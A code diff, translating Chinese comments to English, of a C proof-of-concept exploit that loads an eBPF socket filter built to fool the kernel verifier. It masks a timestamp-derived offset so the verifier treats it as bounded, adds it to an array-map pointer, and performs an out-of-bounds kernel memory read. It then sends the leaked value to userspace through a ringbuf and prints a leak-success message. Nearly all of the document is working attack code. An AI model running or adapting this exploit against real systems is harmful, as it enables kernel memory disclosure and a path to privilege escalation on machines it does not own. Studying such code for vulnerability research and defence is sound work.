@@ -33,7 +33,7 @@
 #define BPF_FUNC_ringbuf_discard 133
 #endif
 
-// --- 標準 BPF 指令常數防呆定義 ---
+// --- defensive definitions of the standard BPF instruction constants ---
 #ifndef BPF_ALU64
 #define BPF_ALU64 0x07
 #endif
@@ -99,7 +99,7 @@
 #define BPF_REG_8 8
 #define BPF_REG_10 10
 
-// --- 修正後的安全指令巨集 (保證 Opcode 100% 正確) ---
+// --- corrected safe instruction macros (guarantees the opcode is 100% correct) ---
 #define BPF_MOV64_IMM(DST, IMM) ((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_K, .dst_reg = DST, .src_reg = 0, .off = 0, .imm = IMM})
 #define BPF_MOV64_REG(DST, SRC) ((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_X, .dst_reg = DST, .src_reg = SRC, .off = 0, .imm = 0})
 #define BPF_LD_MAP_FD(DST, MAP_FD) ((struct bpf_insn){.code = BPF_LD | BPF_DW | BPF_IMM, .dst_reg = DST, .src_reg = 1, .off = 0, .imm = MAP_FD}), ((struct bpf_insn){.code = 0, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = 0})
@@ -166,7 +166,7 @@ int main()
     }
 
     struct bpf_insn prog[] = {
-        // [00-01] 準備 Ringbuf Reserve
+        // [00-01] prepare Ringbuf Reserve
         BPF_LD_MAP_FD(BPF_REG_1, ring_fd),
         // [02]
         BPF_MOV64_IMM(BPF_REG_2, 16),
@@ -174,16 +174,16 @@ int main()
         BPF_MOV64_IMM(BPF_REG_3, 0),
         // [04]
         BPF_EMIT_CALL(BPF_FUNC_ringbuf_reserve),
-        // [05] 如果 R0 == NULL, 跳轉 25 步到 EXIT 區塊 (Index 31)
+        // [05] if R0 == NULL, jump 25 steps to the EXIT block (Index 31)
         BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 25),
 
-        // [06] 備份 Ringbuf 指標到 R6
+        // [06] back up the Ringbuf pointer to R6
         BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),
         // [07]
         BPF_MOV64_IMM(BPF_REG_1, 0),
-        // [08] Stack 構造 Key=0
+        // [08] build Key=0 on the stack
         BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_1, -4),
-        // [09-10] 取出 Array Map 指標
+        // [09-10] fetch the Array Map pointer
         BPF_LD_MAP_FD(BPF_REG_1, array_fd),
         // [11]
         BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
@@ -191,40 +191,40 @@ int main()
         BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
         // [13]
         BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
-        // [14] 如果 R0 == NULL, 跳轉 13 步到 DISCARD 區塊 (Index 28)
+        // [14] if R0 == NULL, jump 13 steps to the DISCARD block (Index 28)
         BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 13),
 
-        // [15] 備份 Array Value 指標到 R7
+        // [15] back up the Array Value pointer to R7
         BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),
-        // [16] 取得動態值 (時間戳) 作為混淆基準
+        // [16] get a dynamic value (timestamp) as the obfuscation base
         BPF_EMIT_CALL(BPF_FUNC_ktime_get_ns),
-        // [17] R8 = 隨機數
+        // [17] R8 = random number
         BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),
-        // [18] 位元運算混淆，讓驗證器以為偏移量被限制在 0 ~ 0x1F8 內
+        // [18] bitwise obfuscation so the verifier believes the offset is bounded to 0 ~ 0x1F8
         BPF_ALU64_IMM(BPF_AND, BPF_REG_8, 0x1F8),
-        // [19] 加入指標算術 (Array 指標 + 動態偏移)
+        // [19] add pointer arithmetic (Array pointer + dynamic offset)
         BPF_ALU64_REG(BPF_ADD, BPF_REG_7, BPF_REG_8),
 
-        // [20] 準備讀取 (預設失敗值)
+        // [20] prepare the read (default failure value)
         BPF_MOV64_IMM(BPF_REG_4, 0xDEADBEEF),
-        // [21] ★ OOB 讀取：讀取 R7 指向的內容到 R4 ★
+        // [21] ★ OOB read: read the contents pointed to by R7 into R4 ★
         BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_7, 0),
 
-        // [22] 將實際 Offset 寫入 Ringbuf
+        // [22] write the actual Offset into the Ringbuf
         BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_8, 0),
-        // [23] 將洩漏的 Kernel 資料寫入 Ringbuf
+        // [23] write the leaked kernel data into the Ringbuf
         BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_4, 8),
         // [24]
         BPF_MOV64_REG(BPF_REG_1, BPF_REG_6),
         // [25]
         BPF_MOV64_IMM(BPF_REG_2, 0),
-        // [26] 提交 Ringbuf 讓 Userspace 讀取
+        // [26] submit the Ringbuf for userspace to read
         BPF_EMIT_CALL(BPF_FUNC_ringbuf_submit),
-        // [27] 執行成功，無條件跳轉 3 步到 EXIT 區塊 (Index 31)
+        // [27] succeeded, unconditional jump 3 steps to the EXIT block (Index 31)
         BPF_JMP_IMM(BPF_JA, 0, 0, 3),
 
         // --- DISCARD BLOCK (Index 28-30) ---
-        // 當 Array 找不到時，必須丟棄已分配的 Ringbuf
+        // when the Array lookup fails, the allocated Ringbuf must be discarded
         /* [28] */ BPF_MOV64_REG(BPF_REG_1, BPF_REG_6),
         /* [29] */ BPF_MOV64_IMM(BPF_REG_2, 0),
         /* [30] */ BPF_EMIT_CALL(BPF_FUNC_ringbuf_discard),
@@ -233,7 +233,7 @@ int main()
         /* [31] */ BPF_MOV64_IMM(BPF_REG_0, 0),
         /* [32] */ BPF_EXIT_INSN()};
 
-    char log_buf[32768] = {0}; // 加大 Log 緩衝區
+    char log_buf[32768] = {0}; // enlarged Log buffer
     memset(&attr, 0, sizeof(attr));
     attr.prog_type = BPF_PROG_TYPE_SOCKET_FILTER;
     attr.insns = (uint64_t)prog;
@@ -265,7 +265,7 @@ int main()
     unsigned long *producer_pos = (unsigned long *)((char *)base + page);
     unsigned long *data = (unsigned long *)((char *)base + 2 * page);
 
-    // 5. 觸發 BPF
+    // 5. trigger BPF
     int socks[2];
     if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks) != 0)
     {
@@ -275,8 +275,8 @@ int main()
     setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd));
     write(socks[1], "TRIGGER", 7);
 
-    // 6. 讀取洩漏的資料: record header 為 8 bytes，接著是 BPF 寫入的
-    //    offset@+0 與 leaked@+8，對應到 data[1] 與 data[2]。
+    // 6. read the leaked data: the record header is 8 bytes, followed by what BPF wrote:
+    //    offset@+0 and leaked@+8, corresponding to data[1] and data[2].
     if (*producer_pos > 0)
     {
         printf("[+] OOB Leak Success! Offset: 0x%lx, Leaked Value: 0x%016lx\n",
